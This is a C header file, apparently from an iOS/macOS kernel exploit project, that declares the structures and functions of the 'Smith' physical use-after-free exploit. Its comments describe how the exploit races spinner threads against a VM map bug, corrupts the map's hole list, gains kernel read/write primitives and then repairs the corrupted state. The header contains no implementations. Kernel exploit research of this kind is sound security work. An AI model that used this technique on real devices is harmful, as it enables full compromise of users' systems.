/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef smith_h
#define smith_h

#include "../../libkfd.h"

#include "../puaf.h"
#include "../info.h"
#include "../info/dynamic_types/vm_map.h"
#include "../info/static_types/vm_map_entry.h"

/*
 * This boolean parameter determines whether the vm_map_lock() is taken from
 * another thread before attempting to clean up the VM map in the main thread.
 */
extern const bool take_vm_map_lock;

/*
 * This structure is allocated once in smith_init() and contains all the data
 * needed/shared across multiple functions for the PUAF part of the exploit.
 */
struct smith_data {
    atomic_bool main_thread_returned;
    atomic_int started_spinner_pthreads;
    struct {
        vm_address_t address;
        vm_size_t size;
    } vme[5];
    struct {
        pthread_t pthread;
        atomic_bool should_start;
        atomic_bool did_start;
        atomic_uintptr_t kaddr;
        atomic_uintptr_t right;
        atomic_uintptr_t max_address;
    } cleanup_vme;
};

/*
 * This function is responsible for the following:
 * 1. Allocate the singleton "smith_data" structure. See the comment above the
 *    smith_data structure for more info.
 * 2. Call smith_helper_init() which is responsible to initialize everything
 *    needed for the PUAF part of the exploit. See the comment above
 *    smith_helper_init() for more info.
 */
void smith_init(struct kfd* kfd);

/*
 * This function is responsible to run the bulk of the work, from triggering the
 * initial vulnerability to achieving a PUAF on an arbitrary number of pages.
 * It is described in detail in the write-up, with a figure illustrating the
 * relevant kernel state after each step.
 */
void smith_run(struct kfd* kfd);

/*
 * This function is responsible for the following:
 * 1. Call smith_helper_cleanup() which is responsible to patch up the corrupted
 *    state of our VM map. Technically, this is the only thing that is required
 *    to get back to a safe state, which means there is no more risk of a kernel
 *    panic if the process exits or performs any VM operation.
 * 2. Deallocate the unused virtual memory that we allocated in step 1 of
 *    smith_run(). In other words, we call vm_deallocate() for the VA range
 *    covered by those 5 map entries (i.e. vme0 to vme4 in the write-up), except
 *    for the two pages used by the kread/kwrite primitive. This step is not
 *    required for "panic-safety".
 */
void smith_cleanup(struct kfd* kfd);

/*
 * This function is responsible to deallocate the virtual memory for the two
 * pages used by the kread/kwrite primitive, i.e. the two pages that we did not
 * deallocate during smith_cleanup(). Once again, this step is not required for
 * "panic-safety". It can be called either if the kread/kwrite primitives no
 * longer rely on kernel objects that are controlled through the PUAF primitive,
 * or if we want to completely tear down the exploit.
 */
void smith_free(struct kfd* kfd);

/*
 * This function is responsible for the following:
 * 1. If the constant "target_hole_size" is non-zero, it will allocate every
 *    hole in our VM map starting at its min_offset, until we find a hole at
 *    least as big as that value (e.g. 10k pages). The reason for that is that
 *    we will corrupt the hole list when we trigger the vulnerability in
 *    smith_run(), such that only the first hole is safe to allocate from. This
 *    is exactly what happens during a typical call to vm_allocate() with
 *    VM_FLAGS_ANYWHERE. That said, many other VM operations that modify our map
 *    entries or our hole list could cause a kernel panic. So, if it is possible
 *    at all, it is much safer to suspend all other threads running in the target
 *    process (e.g. WebContent). In that case, since we would control the only
 *    running threads during the critical section, we could guarantee that no
 *    unsafe VM operations will happen and "target_hole_size" can be set to 0.
 * 2. We need to find the VA range from which we will allocate our 5 map entries
 *    in smith_run() during step 1 (i.e. vme0 to vme4 in the write-up). Those 5
 *    map entries will cover (3X+5) pages, where X is the desired number of
 *    PUAF pages. For reasons that are explained in the write-up, we want to
 *    allocate them towards the end of our VM map. Therefore, we find the last
 *    hole that is big enough to hold our 5 map entries.
 */
void smith_helper_init(struct kfd* kfd);

/*
 * This function is ran by 4 spinner threads spawned from smith_run() in step 2.
 * It simply attempts to change the protection of virtual page zero to
 * VM_PROT_WRITE in a busy-loop, which will return KERN_INVALID_ADDRESS until
 * the main thread triggers the bad clip in vm_map_copyin_internal(). At that
 * point, vm_protect() will return KERN_SUCCESS. Finally, once the main thread
 * returns from vm_copy(), it will set "main_thread_returned" to true in order
 * to signal all 4 spinner threads to exit.
 */
void* smith_helper_spinner_pthread(void* arg);

/*
 * This function is only ran from a thread spawned in smith_helper_init() if the
 * boolean parameter "take_vm_map_lock" is turned on. The reason why it is
 * spawned that early, instead of at the beginning of smith_helper_cleanup(), is
 * that pthread creation will allocate virtual memory for its stack, which might
 * cause a kernel panic because we have not patched the corrupted VM map state
 * yet. It sleeps for 1 ms in a loop until the main thread sets
 * "cleanup_vme.should_start" to true to signal this thread to start the
 * procedure to take the vm_map_lock(). It does so by patching the right child
 * of a map entry to point back to itself, then it sets "cleanup_vme.did_start"
 * to true to signal the main thread to start patching the state, and finally it
 * calls vm_protect(), which will take the vm_map_lock() indefinitely while
 * vm_map_lookup_entry() spins on the right child. Once the main thread has
 * finished patching up the state, it will restore the right child to its
 * original value, which will cause vm_protect() to return and this pthread to
 * exit.
 */
void* smith_helper_cleanup_pthread(void* arg);

/*
 * This function is responsible to patch the corrupted state of our VM map. If
 * the boolean parameter "take_vm_map_lock" is turned on, please see the comment
 * above smith_helper_cleanup_pthread() for more info. Otherwise, the rest of
 * the function simply uses the kread primitive to scan the doubly-linked list
 * of map entries as well as the hole list, and the kwrite primitive to patch it
 * up. This procedure is explained in detail in part C of the write-up.
 */
void smith_helper_cleanup(struct kfd* kfd);

#endif /* smith_h */
